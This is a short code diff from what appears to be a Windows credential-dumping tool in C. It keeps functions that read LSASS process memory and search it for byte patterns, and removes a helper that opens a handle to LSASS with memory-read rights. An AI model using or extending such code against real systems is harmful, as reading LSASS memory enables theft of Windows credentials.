@@ -139,12 +139,6 @@ SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void *memOut, int memOutLen) {
 	return bytesRead;
 }
 
-// Open a handle to the LSASS process
-HANDLE GrabLsassHandle(int pid) {
-	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-	return procHandle;
-}
-
 // Searches for a provided pattern in memory and returns the offset
 DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen) {
 	ULONG offset = 0;
